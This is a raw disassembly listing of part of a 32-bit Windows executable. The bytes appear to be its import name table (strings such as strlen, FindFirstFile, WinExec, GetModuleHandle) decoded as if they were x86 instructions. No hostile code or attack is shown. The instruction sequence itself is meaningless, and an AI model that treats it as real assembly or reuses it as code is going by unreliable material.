  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
